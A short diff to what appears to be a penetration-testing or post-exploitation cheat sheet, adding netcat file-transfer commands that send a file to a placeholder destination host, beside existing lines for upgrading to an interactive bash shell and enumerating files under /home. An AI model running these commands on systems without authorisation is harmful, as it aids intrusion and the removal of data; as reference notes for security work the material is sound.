@@ -3,6 +3,17 @@ Get a bash:
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
+On the receiving end running,
+
+nc -l -p 1234 > out.file
+will begin listening on port 1234.
+
+On the sending end running,
+
+nc -w 3 [destination] 1234 < out.file
+
+
+
 Getting useful info:
 ```shell
 find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
